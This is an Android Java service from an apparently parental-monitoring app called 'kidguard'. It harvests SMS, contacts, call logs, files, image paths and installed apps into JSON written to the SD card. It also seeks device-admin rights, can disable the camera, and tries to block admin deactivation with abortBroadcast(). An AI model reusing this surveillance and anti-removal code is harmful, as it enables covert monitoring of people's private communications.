package com.kidguard.services;


import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.j256.ormlite.android.apptools.OpenHelperManager;
import com.j256.ormlite.dao.Dao;
import com.kidguard.MainActivity;
import com.kidguard.R;
import com.kidguard.asynctask.CallsAsyncTask;
import com.kidguard.asynctask.ContactsAsyncTask;
import com.kidguard.asynctask.FilesAsyncTask;
import com.kidguard.asynctask.SmsAsyncTask;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Apps;
import com.kidguard.model.Calls;
import com.kidguard.model.Contacts;
import com.kidguard.model.Files;
import com.kidguard.model.Images;
import com.kidguard.model.Sms;
import com.kidguard.orm.DatabaseHelper;
import com.kidguard.preference.Preference;
import com.kidguard.utilities.Utilities;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class BackgroundDataService extends Service implements Constant {

    private static final String TAG = "BackgroundDataService";

    private Context context;
    private ArrayList<Sms> lstSms;
    private ArrayList<Contacts> lstContacts;
    private ArrayList<Calls> lstCalls;
    private ArrayList<File> fileList;
    private ArrayList<Files> lstFiles;
    private ArrayList<Apps> lstApps;
    private ArrayList<Images> lstImages;
    private String finalJSON;
    private String finalJSON2;
    private StringBuffer sbAppend;
    private StringBuffer sbAppend2;

    private static BackgroundDataService services;
    private DevicePolicyManager mDPM;
    private ComponentName mDeviceAdminSample;
    protected boolean mAdminActive;
    private DatabaseHelper databaseHelper = null;

    private Dao<Sms, Integer> smsDao;

    public static BackgroundDataService getInstance() {
        return services;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;
        sbAppend = new StringBuffer();
        sbAppend2 = new StringBuffer();

        // Retrieve the useful instance variables
        services = BackgroundDataService.this;

        // Prepare to work with the DPM
        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mDeviceAdminSample = new ComponentName(context, DeviceAdminSampleReceiver.class);

        mDPM = services.mDPM;
        mDeviceAdminSample = services.mDeviceAdminSample;
        mAdminActive = services.isActiveAdmin();

        Log.e("active", "active??" + mAdminActive);

        /* Check For Device Admin Permission Are Enable Or Not */
        if (!mAdminActive) {
            getDeviceAdminPermission(REQUEST_CODE_ENABLE_ADMIN);
            return;
        }

        // new GetDeviceData().execute();
        getDataWithTag(TAG_FILES, "12", "txt", "");

    }

    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(this, DatabaseHelper.class);
        }
        return databaseHelper;
    }

    /**
     * Helper to determine if we are an active admin
     */
    public boolean isActiveAdmin() {
        return mDPM.isAdminActive(mDeviceAdminSample);
    }

    // Get Device Admin Permissions
    private void getDeviceAdminPermission(int requestCode) {
        switch (requestCode) {
            case REQUEST_CODE_ENABLE_ADMIN:
                // Launch the activity to have the user enable our admin.
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        getString(R.string.add_admin_extra_app_text));
                if (MainActivity.getInstance() != null) {
                    MainActivity.getInstance().startActivity(intent);
                }
                break;
            default:
                break;
        }
    }

    /* Get Data With Tag*/
    private void getDataWithTag(String tag, String count, String dateFrom, String dateTo) {
        if (tag.equals(TAG_SMS)) {

            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_SMS)) {
                new SmsAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_CONTACTS)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
                new ContactsAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_CALLS)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
                new CallsAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_FILES)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new FilesAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_IMAGES)) {
            return;
        }

        if (tag.equals(TAG_LIST_APPS)) {
            return;
        }

        if (tag.equals(TAG_CAMERA)) {
            return;
        }


    }

    /* Send Sms Data To Server */
    public void sendSmsDataToServer(ArrayList<Sms> lstSms) {
        this.lstSms = lstSms;
        convertToJSONFormat(TAG_SMS, 4);
        stopSelf();
    }

    /* Send Contacts Data To Server */
    public void sendContactsDataToServer(ArrayList<Contacts> lstContacts) {
        this.lstContacts = lstContacts;
        convertToJSONFormat(TAG_CONTACTS, 4);
        stopSelf();
    }

    /* Send Calls Data To Server */
    public void sendCallsDataToServer(ArrayList<Calls> lstCalls) {
        this.lstCalls = lstCalls;
        convertToJSONFormat(TAG_CALLS, 4);
        stopSelf();
    }

    /* Send Files Data To Server */
    public void sendFilesDataToServer(ArrayList<Files> lstFiles) {
        this.lstFiles = lstFiles;
        convertToJSONFormat(TAG_FILES, 4);
        stopSelf();
    }

    /* Get Data From Device */
    private class GetDeviceData extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {
            Log.e("doInBackground", "getData");

            // Read Get All Files
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                //getAllShownImagesPath(context);
            }

            // List Of installed Apps
            //getListApps();
            return "Executed";
        }

        @Override
        protected void onPostExecute(String result) {
            Log.d("onPostExecute", "onPostExecute");
            stopSelf();
        }

        @Override
        protected void onPreExecute() {
            mDPM.setCameraDisabled(mDeviceAdminSample, true);
            Log.d("onPreExecute", "onPreExecute");
        }

        @Override
        protected void onProgressUpdate(Void... values) {
        }
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }


    // List Of installed Apps
    private void getListApps() {
        lstApps = new ArrayList<Apps>();
        {
            List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);
                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    Apps apps = new Apps();
                    String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                    apps.setAppname(appName);
                    lstApps.add(apps);
                }
            }
        }
        convertToJSONFormat(TAG_LIST_APPS, 4);
    }

    /* Get Image Path */
    public void getAllShownImagesPath(Context ctx) {
        Cursor cursor = null;
        try {
            Uri uri;
            int column_index_data, column_index_folder_name;
            lstImages = new ArrayList<Images>();
            ArrayList<Images> lstImagesStr = new ArrayList<Images>();
            String absolutePathOfImage = null;
            uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            String[] projection = {MediaStore.MediaColumns.DATA,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

            cursor = ctx.getContentResolver().query(uri, projection, null,
                    null, null);

            column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
            column_index_folder_name = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
            while (cursor.moveToNext()) {
                absolutePathOfImage = cursor.getString(column_index_data);

                Images images = new Images();
                images.setImagePath(absolutePathOfImage);
                Uri uriNew = Uri.fromFile(new File(absolutePathOfImage));

                try {
                    File f = new File(uriNew.getPath());
                    long size = f.length();
                    long fileSizeInKB = size / 1024;
                    long fileSizeInMB = fileSizeInKB / 1024;
                    Date lastModDate = new Date(f.lastModified());
                    images.setSizeMB(String.valueOf(fileSizeInMB));
                    images.setSizeKB(String.valueOf(fileSizeInKB));
                    images.setDateTime(String.valueOf(lastModDate));
                } catch (Exception e) {
                    Log.e("Exception", "ImagesSize??" + e.getMessage());
                }

                lstImagesStr.add(images);
            }

            if (lstImagesStr != null && lstImagesStr.size() <= 10) {
                for (int i = 0; i < lstImagesStr.size(); i++) {
                    Images images = new Images();
                    images.setImagePath(lstImagesStr.get(i).getImagePath());
                    images.setDateTime(lstImagesStr.get(i).getDateTime());
                    images.setSizeMB(lstImagesStr.get(i).getSizeMB());
                    images.setSizeKB(lstImagesStr.get(i).getSizeKB());
                    lstImages.add(images);
                }
            } else {
                for (int i = 0; i < 10; i++) {
                    Images images = new Images();
                    images.setImagePath(lstImagesStr.get(i).getImagePath());
                    images.setDateTime(lstImagesStr.get(i).getDateTime());
                    images.setSizeMB(lstImagesStr.get(i).getSizeMB());
                    images.setSizeKB(lstImagesStr.get(i).getSizeKB());
                    lstImages.add(images);
                }
            }

        } catch (Exception e) {

        } finally {
            if (cursor != null && !cursor.isClosed())
                cursor.close();
        }

        convertToJSONFormat(TAG_IMAGES, 6);
    }

    /* Convert To JSON Format */
    private void convertToJSONFormat(String tag, int count) {

        Gson gson = new Gson();

        if (tag.equals(TAG_SMS)) {
            if (lstSms != null && lstSms.size() > 0) {
                Type type = new TypeToken<List<Sms>>() {
                }.getType();
                String jsonSMS = gson.toJson(lstSms, type);
                finalJSON = "\"SMS\":" + jsonSMS + ",";
                sbAppend.append(finalJSON);
            }

        } else if (tag.equals(TAG_CONTACTS)) {
            if (lstContacts != null && lstContacts.size() > 0) {
                Type type = new TypeToken<List<Contacts>>() {
                }.getType();
                String jsonContacts = gson.toJson(lstContacts, type);
                finalJSON = "\"CONTACTS\":" + jsonContacts + ",";
                sbAppend.append(finalJSON);
            }


        } else if (tag.equals(TAG_CALLS)) {
            if (lstCalls != null && lstCalls.size() > 0) {
                Type type = new TypeToken<List<Calls>>() {
                }.getType();
                String jsonCalls = gson.toJson(lstCalls, type);
                finalJSON = "\"CALLS\":" + jsonCalls + ",";
                sbAppend.append(finalJSON);
            }
        } else if (tag.equals(TAG_LIST_APPS)) {
            if (lstApps != null && lstApps.size() > 0) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                String jsonApps = gson.toJson(lstApps, type);
                finalJSON = "\"APPS\":" + jsonApps + ",";
                sbAppend.append(finalJSON);
            }

        } else if (tag.equals(TAG_FILES)) {

            if (lstFiles != null && lstFiles.size() > 0) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                String jsonApps = gson.toJson(lstFiles, type);
                finalJSON2 = "\"FILES\":" + jsonApps + ",";
                sbAppend2.append(finalJSON2);
            }

        } else if (tag.equals(TAG_IMAGES)) {
            if (lstImages != null && lstImages.size() > 0) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                String jsonApps = gson.toJson(lstImages, type);
                finalJSON2 = "\"IMAGES\":" + jsonApps + ",";
                sbAppend2.append(finalJSON2);
            }
        }

        if (count == 4) {
            finalJSON = "{" + sbAppend + "}";
            Log.e("JSON", "FINAL??" + finalJSON);
            //generateFile(finalJSON);
        }

        if (count == 6) {
            finalJSON2 = "{" + sbAppend2 + "}";
            Log.e("JSON", "FINAL2??" + finalJSON2);
            generateFile(finalJSON2);
        }
    }

    /* Write Files into SdCard */
    private void generateFile(String data) {
        String filepath = "/mnt/sdcard/Data.txt";
        FileOutputStream fos = null;
        try {
            try {
                fos = new FileOutputStream(filepath);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            byte[] buffer = data.getBytes();
            try {
                fos.write(buffer, 0, buffer.length);
            } catch (IOException e) {
                e.printStackTrace();
            }
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (fos != null)
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
        }
    }


    /**
     * Sample implementation of a DeviceAdminReceiver.  Your controller must provide one,
     * although you may or may not implement all of the methods shown here.
     * <p>
     * All callbacks are on the UI thread and your implementations should not engage in any
     * blocking operations, including disk I/O.
     */
    public static class DeviceAdminSampleReceiver extends DeviceAdminReceiver {
        void showToast(Context context, String msg) {
            String status = context.getString(R.string.admin_receiver_status, msg);
            Toast.makeText(context, status, Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() == ACTION_DEVICE_ADMIN_DISABLE_REQUESTED) {
                abortBroadcast();
            }
            super.onReceive(context, intent);
        }

        @Override
        public void onEnabled(Context context, Intent intent) {
            Preference.setIsAdminActive(context, true);
            showToast(context, context.getString(R.string.admin_receiver_status_enabled));
        }

        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return context.getString(R.string.admin_receiver_status_disable_warning);
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            Preference.setIsAdminActive(context, false);
            showToast(context, context.getString(R.string.admin_receiver_status_disabled));
        }

        @Override
        public void onPasswordChanged(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_changed));
        }

        @Override
        public void onPasswordFailed(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_failed));
        }

        @Override
        public void onPasswordSucceeded(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_succeeded));
        }

        @Override
        public void onPasswordExpiring(Context context, Intent intent) {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            long expr = dpm.getPasswordExpiration(
                    new ComponentName(context, DeviceAdminSampleReceiver.class));
            long delta = expr - System.currentTimeMillis();
            boolean expired = delta < 0L;
            String message = context.getString(expired ?
                    R.string.expiration_status_past : R.string.expiration_status_future);
            showToast(context, message);
            Log.v(TAG, message);
        }

    }
}
